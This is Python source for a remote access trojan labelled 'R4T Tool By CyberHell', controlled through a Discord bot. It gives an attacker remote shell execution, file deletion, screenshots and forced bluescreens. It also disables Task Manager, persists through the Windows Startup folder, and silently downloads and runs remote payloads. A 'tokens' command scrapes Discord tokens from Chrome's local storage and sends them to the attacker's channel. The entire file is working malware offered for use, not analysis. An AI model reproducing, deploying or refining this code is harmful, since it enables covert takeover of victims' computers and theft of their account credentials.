import os
import discord
from discord.ext import commands
import threading
import ctypes
import webbrowser
import subprocess
import pyautogui
import ctypes
import aiohttp
import tempfile
import re
# ------------------------------------------------------------------------ #

token = "YOUR-TOKEN-HERE"

# ------------------------------------------------------------------------ #


intents = discord.Intents.all()
client = commands.Bot(command_prefix='!', intents=intents, help_command=None)

guild_iid = 'discord_guild_id'
guild_id = int(guild_id)
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")

def get_computer_channel():
    guild = client.get_guild(guild_id)
    if not guild:
        return None

    computer_name = os.environ['COMPUTERNAME'].lower()
    return discord.utils.get(guild.text_channels, name=computer_name)

# -------------------------------------------------------------------- #

@client.event
async def on_ready():
    activity = discord.Game(name="⚡ R4T Tool By CyberHell!")
    await client.change_presence(activity=activity)
    computer_name = os.environ['COMPUTERNAME'].lower()  
    guild = client.get_guild(guild_id)

    if guild is None:
        exit()

    existing_channel = discord.utils.get(guild.text_channels, name=computer_name)
    
    if existing_channel:
        await existing_channel.send(f"Resumed session with hostname '{computer_name}' ||@everyone||")
    else:
        new_channel = await guild.create_text_channel(computer_name)
        await new_channel.send(f"Started new session with hostname '{computer_name}' ||@everyone||")
@client.command(name="help")
async def custom_help(ctx):
    embed = discord.Embed(title="🆘 Help Menu", description="List of available commands:", color=discord.Color.red())
    embed.add_field(name="🔹 `!help`", value="Displays this message", inline=False)
    embed.add_field(name="🔹 `!message <text>`", value="Displays a popup on your PC", inline=False)
    embed.add_field(name="🔹 `!website <url>`",value="Opens the website on the pc.", inline=False)
    embed.add_field(name="🔹 `!shell <command>`", value="Executes a shell command on the pc.", inline=False)
    embed.add_field(name="🔹 `!delete <file_path> `",value="Delete File/Program/Anything",inline=False)
    embed.add_field(name="🔹 `!shutdown`", value="Shutdown the pc.", inline=False)
    embed.add_field(name="🔹 `!restart`", value="Restart the pc.", inline=False)
    embed.add_field(name="🔹 `!logout`", value="Logout the pc.", inline=False)
    embed.add_field(name="🔹 `!displaydir <dir_path>`", value="Display files in a directory.", inline=False)
    embed.add_field(name="🔹 `!currentdir`", value="Display current directory.", inline=False)
    embed.add_field(name="🔹 `!screenshot`", value="Take a screenshot of the pc.", inline=False)
    embed.add_field(name="🔹 `!prockill <process_name>`", value="Kill a process by name.", inline=False)
    embed.add_field(name="🔹 `!bluescreen`", value="Do bluescreen.", inline=False)
    embed.add_field(name="🔹 `!displayoff`", value="Turns off the display.", inline=False)
    embed.add_field(name="🔹 `!displayon`", value="Turns on the display.", inline=False)
    embed.add_field(name="🔹 `!enabletaskmgr`", value="Re-enables Task Manager on the PC.", inline=False)
    embed.add_field(name="🔹 `!disabletaskmgr`", value="Disable Task Manager on the PC.", inline=False)
    embed.add_field(name="🔹 `!startup <attachment>`", value="Adds an attached file to Windows Startup.", inline=False)
    embed.add_field(name="🔹 `!dar <URL> <filename>`", value="Downloads and runs a file in the background.", inline=False)
    embed.add_field(name="🔹 `!tokens` ", value="Gives you the discord token of the user!",inline=False)
    embed.set_footer(text="R4T Tool by CyberHell 💀")
    await ctx.send(embed=embed)


@client.command(name="message")
async def popup(ctx, *, message: str):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    ctypes.windll.user32.MessageBoxW(0, message, "Alert", 0)
    await ctx.send(f"✅ Popup displayed with message: `{message}`")  
@client.command()
async def website(ctx, url):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    webbrowser.open(url)
    await ctx.send(f"✅ Website opened: `{url}`")
@client.command(name="shell")
async def shell(ctx, *, command):
    try:
        channel = get_computer_channel()
        if not channel or ctx.channel.id != channel.id:
            return
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()

        if stdout:
            output = f"```\n{stdout}\n```"
        elif stderr:
            output = f"❌ Error:\n```\n{stderr}\n```"
        else:
            output = "✅ Command executed successfully."

        await ctx.send(output)

    except Exception as e:
        await ctx.send(f"❌ Error: `{e}`")
@client.command(name="delete")
async def delete(ctx, *, path: str):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    if not os.path.exists(path): 
        await ctx.send(f"❌ File not found: `{path}`")
        return
    
    if os.path.isdir(path):  
        await ctx.send(f"❌ `{path}` is a directory. Use a proper command for that.")
        return

    try:
        os.remove(path)  
        await ctx.send(f"✅ Deleted: `{path}`")
    except Exception as e:
        await ctx.send(f"❌ Error deleting `{path}`: `{e}`")
@client.command(name="shutdown")        
async def shutdown(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    result = os.system("shutdown /s /t 1")
    if result == 0:
        await ctx.send("✅ PC is shutting down...")   
    else:
        await ctx.send("❌ Error shutting down the PC, Try running as administrator.")
@client.command(name="restart")
async def restart(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    result = os.system("shutdown /r /t 1")
    if result == 0:
        await ctx.send("✅ PC is restarting...")   
    else:
        await ctx.send("❌ Error restarting the PC, Try running as administrator.")
@client.command(name="logout")
async def logout(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    result = os.system("shutdown -l")
    if result == 0:
        await ctx.send("✅ PC is logging out...")   
    else:
        await ctx.send("❌ Error logging out the PC, Try running as administrator.")  
@client.command(name="displaydir")
async def displaydir(ctx, path: str):
    try:
        channel = get_computer_channel()
        if not channel or ctx.channel.id != channel.id:
            return
        if not os.path.exists(path):
            await ctx.send(f"❌ Directory not found: `{path}`")
            return


        if os.path.isdir(path):
            files = os.listdir(path)
            file_list = "\n".join(files) if files else "📂 (Empty Directory)"  


            formatted_path = path.replace("\\", "\\\\")  

            await ctx.send(f"✅ **Files in `{formatted_path}`:**\n```\n{file_list}\n```")
        else:
            await ctx.send(f"❌ `{path}` is not a directory.")
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")  
@client.command(name="currentdir")
async def currentdir(ctx):
    try:
        channel = get_computer_channel()
        if not channel or ctx.channel.id != channel.id:
            return
        current_directory = os.getcwd()  
        formatted_path = current_directory.replace("\\", "\\\\")  
        await ctx.send(f"📂 **Current Directory:** `{formatted_path}`")
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")  
@client.command(name="screenshot")
async def screenshot(ctx):
    try:
        channel = get_computer_channel()
        if not channel or ctx.channel.id != channel.id:
            return
        appdata_path = os.path.join(os.getenv("APPDATA"), "screenshot.png") 
        screenshot = pyautogui.screenshot()
        screenshot.save(appdata_path)     
        await ctx.send("📸 **Here is the screenshot:***",file=discord.File(appdata_path)) 
        os.remove(appdata_path)
    except Exception as e:
        await ctx.send(f"⚠️ Error: `{e}`")    
@client.command(name="prockill")
async def prockill(ctx, process_name: str):
    try:
        channel = get_computer_channel()
        if not channel or ctx.channel.id != channel.id:
            return
        result = subprocess.run(
            ["taskkill", "/f", "/im", process_name],
            capture_output=True, text=True
        )
        if "SUCCESS" in result.stdout:
            await ctx.send(f"✅ Process `{process_name}` killed successfully.")
        else:
            await ctx.send(f"⚠️ Failed to kill `{process_name}`.\n```{result.stdout}```")
    except Exception as e:
        await ctx.send(f"❌ Error killing process `{process_name}`: `{e}`")   
@client.command(name="bluescreen")
async def bluescreen(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xC000007B, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    await ctx.send("⚠️ Triggered a bluescreen.")
@client.command(name="displayoff")
async def displayoff(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)
    await ctx.send("📴 Display turned off.")

@client.command(name="displayon")
async def displayon(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    ctypes.windll.user32.mouse_event(1, 0, 0, 0, 0)  
    await ctx.send("📺 Display turned on.")
@client.command(name="disabletaskmgr")
async def disabletaskmgr(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return    
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("🚫 **Permission Denied!** You need to run this program as Administrator to perform this action.")
        return
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    await ctx.send("🚫 **Task Manager Disabled!**")

@client.command(name="enabletaskmgr")
async def enabletaskmgr(ctx):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return
    if not ctypes.windll.shell32.IsUserAnAdmin():
        await ctx.send("🚫 **Permission Denied!** You need to run this program as Administrator to perform this action.")
        return
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    await ctx.send("✅ **Task Manager Enabled!**")
@client.command(name="startup") 
async def startup(ctx, file: discord.Attachment):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return    
    if not file:
        await ctx.send("❌ No file attached.")
        return
    file_path = os.path.join(startup_folder, file.filename)

    async with aiohttp.ClientSession() as session:
        async with session.get(file.url) as resp:
            if resp.status == 200:
                with open(file_path, "wb") as f:
                          f.write(await resp.read())
                await ctx.send(f"✅ File `{file.filename}` added to startup.") 
            else:
                await ctx.send("❌ Error downloading file.") 
@client.command(name="dar")
async def dar(ctx, url: str, filename: str):
    channel = get_computer_channel()
    if not channel or ctx.channel.id != channel.id:
        return  
    await ctx.send(f"⏳ Downloading `{filename}` from `{url}`...", delete_after=5)
    temp_path = os.path.join(tempfile.gettempdir(), filename)
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    with open(temp_path, "wb") as f:
                        f.write(await resp.read())
                    await ctx.send(f"🚀 `{filename}` is now running in the background!", delete_after=5)
                    subprocess.Popen(temp_path, shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
                    await ctx.send("")
                else:
                    await ctx.send("❌ Error downloading file.")
    except Exception as e:
        await ctx.send(f"❌ Error: `{e}`") 
@client.command(name="tokens")
async def tokens(ctx):
    TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
    def find_tokens(filepath):
        try:
            with open(filepath, encoding="utf-8", errors="ignore") as file:
                return re.findall(TOKEN_REGEX_PATTERN, file.read())
        except Exception:
            return []     
    def collect_tokens(directory):
        if not os.path.exists(directory):  
            return set()
        tokens = set()
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            if os.path.isfile(filepath):  
                tokens.update(find_tokens(filepath))
        return tokens   
    directory = os.path.join(os.getenv("LOCALAPPDATA"), r"Google\Chrome\User Data\Default\Local Storage\leveldb")
    tokens = collect_tokens(directory)
    if tokens:
        await ctx.send(f"Tokens found: {', '.join(tokens)}\n")                             
client.run(token)

